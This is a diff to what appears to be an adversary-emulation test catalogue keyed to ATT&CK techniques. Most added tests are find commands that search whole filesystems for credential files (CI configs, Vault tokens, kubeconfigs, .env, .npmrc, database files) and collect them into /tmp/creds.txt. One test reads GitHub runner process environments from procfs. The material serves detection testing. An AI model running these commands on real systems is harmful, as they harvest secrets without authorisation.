+          default: ".travis.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Gitlab CI Config File
+      auto_generated_guid: 98618067-a2c7-4d4b-9c89-403a90f43656
+      description: 'Find GitLab CI configuration files (.gitlab-ci.yml), which may
+        contain credentials, secrets, or sensitive environment variables.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".gitlab-ci.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Terraform credential files
+      auto_generated_guid: c3372ae9-b9bf-427a-b330-cb04fecb9c1d
+      description: 'Find Terraform credential files which may contain sensitive values
+        such as API keys, passwords, and infrastructure secrets. Searches for both
+        terraform.tfvars and terraform.tfstate.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filenames:
+          description: Space-separated Terraform credential filenames to search for
+          type: string
+          default: terraform.tfvars terraform.tfstate
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'for filename in #{filenames}; do find #{file_path} -name "$filename"
+          -type f #{optional_flags} 2>/dev/null; done
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Docker credentials
+      auto_generated_guid: 5a668739-3a2f-4265-895f-c0e1e0b09eaa
+      description: 'Find local Docker credentials from file, defaults to using / as
+        the look path.
+
+        '
+      supported_platforms:
+      - macos
+      - linux
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: config.json
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -path ''*/.docker/#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find HashiCorp Vault token files
+      auto_generated_guid: 2951c09f-b4f9-4248-ba75-6373709ebd55
+      description: 'Find HashiCorp Vault token files (~/.vault-token), which contain
+        plaintext Vault tokens that grant access to secrets stored in Vault.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".vault-token"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Drone CI Config File
+      auto_generated_guid: a11f22fb-a037-4cc2-bcfc-a133b287aa1b
+      description: 'Find Drone CI configuration files (.drone.yml), which may contain
+        credentials, secrets, or sensitive environment variables used in Drone CI/CD
+        pipelines.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: ".drone.yml"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Dump GitHub Actions Runner Environment Variables from procfs
+      auto_generated_guid: 51cde30c-0311-449a-8e15-542b59f95939
+      description: |
+        Locates GitHub Actions runner processes (Runner.Worker, Runner.Listener, runsvc, run.sh)
+        and reads their environment variables from /proc/<pid>/environ, filtering for keys
+        containing "env" or "ssh". This mirrors TeamPCP malware behavior that harvests
+        credentials and secrets from self-hosted runner processes.
+
+        Reference: https://www.aquasec.com/blog/trivy-supply-chain-attack-what-you-need-to-know/
+      supported_platforms:
+      - linux
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'for pid in $(pgrep -f ''Runner.Worker|Runner.Listener|runsvc|run.sh''
+          2>/dev/null); do tr ''\0'' ''\n'' < /proc/$pid/environ 2>/dev/null | grep
+          -iE ''env|ssh''; done
+
+          '
+    - name: Search for Git Credential Files
+      auto_generated_guid: c8367142-cbb0-47a4-96c7-ff9969fd64ea
+      description: |
+        Searches the specified directory for a git credential file, which
+        may contain plaintext credentials, access tokens, or credential helper
+        configurations. Example files include .git-credentials and .gitconfig.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: directory to search under
+          type: string
+          default: "/"
+        filename:
+          description: git credential file to search for
+          type: string
+          default: ".git-credentials"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find .env Files Containing Application Credentials
+      auto_generated_guid: bcf8e58a-1cb7-4988-9227-3d3c70751811
+      description: |
+        Searches common web application and service directories for .env files
+        (.env, .env.local, .env.production, .env.development, .env.staging) that may
+        contain credentials such as API keys, database passwords, and service secrets.
+        Adversaries targeting web servers or containerized environments search for these
+        files after gaining host access to harvest application-level credentials.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Space-separated list of directories to search
+          type: string
+          default: "/home /Users /root /opt /srv /var/www /app /data /var/lib /tmp"
+        filename:
+          description: ".env filename pattern to search for"
+          type: string
+          default: ".env*"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        name: sh
+        elevation_required: false
+        command: 'find #{file_path} -maxdepth 6 -name "#{filename}" -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+    - name: Find database credential files
+      auto_generated_guid: e62bccc4-0200-47e9-b40a-4ea5328495b3
+      description: 'Find user-level database credential files. Examples include ~/.pgpass,
+        ~/.my.cnf, and ~/.mongorc.js.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filenames:
+          description: Space-separated database credential filenames to search for
+          type: string
+          default: ".pgpass .my.cnf .mongorc.js"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: |
+          for filename in #{filenames}; do
+            find #{file_path} -name "$filename" -type f #{optional_flags} 2>/dev/null
+          done
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find system database configuration files
+      auto_generated_guid: d1665562-c389-49fc-9cbe-92236816a105
+      description: 'Find system-level database configuration files (/etc/mysql/my.cnf,
+        /etc/redis/redis.conf) which may contain credentials. Requires root privileges.
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: |
+          find /etc/mysql -name 'my.cnf' -type f #{optional_flags} 2>/dev/null
+          find /etc/redis -name 'redis.conf' -type f #{optional_flags} 2>/dev/null
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        elevation_required: true
+        name: sh
+    - name: Find npm registry credential files
+      auto_generated_guid: 2a24627b-061b-43e6-bece-a5b0638841dd
+      description: 'Find .npmrc files, which may contain plaintext npm registry authentication
+        tokens.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Credential file to search for
+          type: string
+          default: ".npmrc"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Access Jenkinsfile
+      auto_generated_guid: 18318786-e0c0-4bdf-979f-f022e6f5f2ef
+      description: 'Find Jenkinsfiles, which may contain credentials, secrets, or
+        sensitive environment variables used in Jenkins CI/CD pipelines.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        filename:
+          description: Name of file to search for
+          type: string
+          default: Jenkinsfile
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -name ''#{filename}'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Kubernetes user configuration files
+      auto_generated_guid: 14575d1f-16b3-4a0b-8986-540e42e6a6cc
+      description: 'Find Kubernetes user configuration files (~/.kube/config), which
+        contain API server addresses, client certificates, and bearer tokens that
+        grant access to the Kubernetes cluster. Defaults to using / as the search
+        path.
+
+        '
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        file_path:
+          description: Path to search
+          type: string
+          default: "/"
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: 'find #{file_path} -path ''*/.kube/config'' -type f #{optional_flags}
+          2>/dev/null
+
+          '
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        name: sh
+    - name: Find Kubernetes cluster configuration files
+      auto_generated_guid: af664fc0-0772-4866-a661-d49a22a13487
+      description: 'Find Kubernetes configuration files requiring root privileges,
+        including the root user kubeconfig (~/.kube/config) and cluster-level configuration
+        files in /etc/kubernetes/. These files contain API server addresses, client
+        certificates, and bearer tokens that grant access to the Kubernetes cluster.
+
+        '
+      supported_platforms:
+      - linux
+      input_arguments:
+        optional_flags:
+          description: optional flags passed into find that should be ran
+          type: string
+          default: -exec sh -c 'echo "=== $1 ===" >> /tmp/creds.txt; cat "$1" >> /tmp/creds.txt'
+            _ {} \;
+      executor:
+        command: |
+          find /root -path '*/.kube/config' -type f #{optional_flags} 2>/dev/null
+          find /etc/kubernetes -name '*.conf' -type f #{optional_flags} 2>/dev/null
+        cleanup_command: 'rm -f /tmp/creds.txt
+
+          '
+        elevation_required: true
         name: sh
   T1606.001:
     technique:
@@ -52040,7 +52908,7 @@ credential-access:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:25.253Z'
-      name: 'OS Credential Dumping: /etc/passwd, /etc/master.passwd and /etc/shadow'
+      name: 'OS Credential Dumping: /etc/passwd and /etc/shadow'
       description: |-
         Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information, including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)
 
@@ -52863,7 +53731,7 @@ credential-access:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:38.351Z'
-      name: Kubernetes List Secrets
+      name: 'Unsecured Credentials: Container API'
       description: "Adversaries may gather credentials via APIs within a containers
         environment. APIs in these environments, such as the Docker API and Kubernetes
         APIs, allow a user to remotely manage their container resources and cluster
@@ -54675,13 +55543,15 @@ discovery:
           type: path
           default: "/tmp/T1082.txt"
       executor:
-        command: "uname -a >> #{output_file}\nif [ -f /etc/lsb-release ]; then cat
-          /etc/lsb-release >> #{output_file}; fi\nif [ -f /etc/redhat-release ]; then
-          cat /etc/redhat-release >> #{output_file}; fi   \nif [ -f /etc/issue ];
-          then cat /etc/issue >> #{output_file}; fi\nif [ -f /etc/os-release ]; then
-          cat /etc/os-release >> #{output_file}; fi\nuptime >> #{output_file}\ncat
-          #{output_file} 2>/dev/null\n"
-        cleanup_command: 'rm #{output_file} 2>/dev/null
+        command: |
+          uname -a >> "#{output_file}"
+          if [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> "#{output_file}"; fi
+          if [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> "#{output_file}"; fi
+          if [ -f /etc/issue ]; then cat /etc/issue >> "#{output_file}"; fi
+          if [ -f /etc/os-release ]; then cat /etc/os-release >> "#{output_file}"; fi
+          uptime >> "#{output_file}"
+          cat "#{output_file}" 2>/dev/null
+        cleanup_command: 'rm "#{output_file}" 2>/dev/null
 
           '
         name: sh
@@ -55014,7 +55884,7 @@ discovery:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.630Z'
-      name: Time Based Evasion
+      name: 'Virtualization/Sandbox Evasion: Time Based Checks'
       description: "Adversaries may employ various time-based methods to detect virtualization
         and analysis environments, particularly those that attempt to manipulate time
         mechanisms to simulate longer elapses of time. This may include enumerating
@@ -55239,7 +56109,7 @@ discovery:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.635Z'
-      name: Browser Bookmark Discovery
+      name: Browser Information Discovery
       description: |-
         Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)
 
@@ -57021,6 +57891,40 @@ discovery:
 
           '
         name: sh
+    - name: Enumerate SSH Configuration
+      auto_generated_guid: 6fc814cb-16d1-43e6-80b3-2ff2a45250d1
+      description: |
+        SSH metadata files (authorized_keys, known_hosts, config) can be used to
+        discover remote systems and trust relationships. known_hosts
+        reveals previously connected servers, config exposes host aliases and jump
+        proxies, and authorized_keys shows which public keys are trusted for login.
+      supported_platforms:
+      - linux
+      - macos
+      input_arguments:
+        search_path:
+          description: Directory to search under
+          type: string
+          default: "/"
+        filename:
+          description: SSH metadata file to search for
+          type: string
+          default: known_hosts
+        output_file:
+          description: File to write results to
+          type: path
+          default: "/tmp/ssh_enum.txt"
+      executor:
+        name: bash
+        elevation_required: false
+        command: 'find #{search_path} -name "#{filename}" -type f 2>/dev/null | while
+          read -r file; do echo "=== $file ===" >> #{output_file}; cat "$file" >>
+          #{output_file}; done
+
+          '
+        cleanup_command: 'rm -f #{output_file}
+
+          '
   T1046:
     technique:
       type: attack-pattern
@@ -66489,7 +67393,7 @@ initial-access:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2025-10-24T17:49:18.341Z'
-      name: Compromise Software Supply Chain
+      name: 'Supply Chain Compromise: Compromise Software Supply Chain'
       description: "Adversaries may manipulate application software prior to receipt
         by a final consumer for the purpose of data or system compromise. Supply chain
         compromise of software can take place in a number of ways, including manipulation
@@ -67607,8 +68511,8 @@ exfiltration:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.705Z'
-      name: Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric
-        Encrypted Non-C2 Protocol
+      name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric
+        Encrypted Non-C2 Protocol'
       description: "Adversaries may steal data by exfiltrating it over an asymmetrically
         encrypted network protocol other than that of the existing command and control
         channel. The data may also be sent to an alternate network location from the
@@ -68073,9 +68977,9 @@ exfiltration:
           $arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
           $operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()
           if ($operatingSystem -match "darwin") {
-            Invoke-WebRequest "https://downloads.rclone.org/rclone-current-osx-$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/rclone.zip"
+            Invoke-WebRequest "https://downloads.rclone.org/rclone-current-osx-$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/rclone.zip" -UseBasicParsing
           } elseif ($operatingSystem -match "linux") {
-            Invoke-WebRequest "https://downloads.rclone.org/rclone-current-linux-$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/rclone.zip"
+            Invoke-WebRequest "https://downloads.rclone.org/rclone-current-linux-$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/rclone.zip" -UseBasicParsing
           }
           Expand-archive -path "PathToAtomicsFolder/../ExternalPayloads/rclone.zip" -DestinationPath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/" -force
       - description: terraform must exist at (#{terraform_path})
@@ -68087,9 +68991,9 @@ exfiltration:
           $arch = ([System.Runtime.InteropServices.RuntimeInformation]::OSArchitecture).ToString().ToLower()
           $operatingSystem = ([System.Runtime.InteropServices.RuntimeInformation]::OSDescription).ToString().ToLower()
           if ($operatingSystem -match "darwin") {
-            Invoke-WebRequest "https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_darwin_$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/terraform.zip"
+            Invoke-WebRequest "https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_darwin_$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/terraform.zip" -UseBasicParsing
           } elseif ($operatingSystem -match "linux") {
-            Invoke-WebRequest "https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_linux_$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/terraform.zip"
+            Invoke-WebRequest "https://releases.hashicorp.com/terraform/1.10.5/terraform_1.10.5_linux_$arch.zip" -OutFile "PathToAtomicsFolder/../ExternalPayloads/terraform.zip" -UseBasicParsing
           }
           Expand-archive -path "PathToAtomicsFolder/../ExternalPayloads/terraform.zip" -DestinationPath "PathToAtomicsFolder/../ExternalPayloads/T1567.002/terraform-v1.10.5/" -force
       - description: 'Must provide a valid directory or file path to exfiltrate to
@@ -68362,7 +69266,7 @@ exfiltration:
       object_marking_refs:
       - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
       modified: '2026-05-12T15:12:00.726Z'
-      name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated
+      name: 'Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted
         Non-C2 Protocol'
       description: "Adversaries may steal data by exfiltrating it over an un-encrypted
         network protocol other than that of the existing command and control channel.
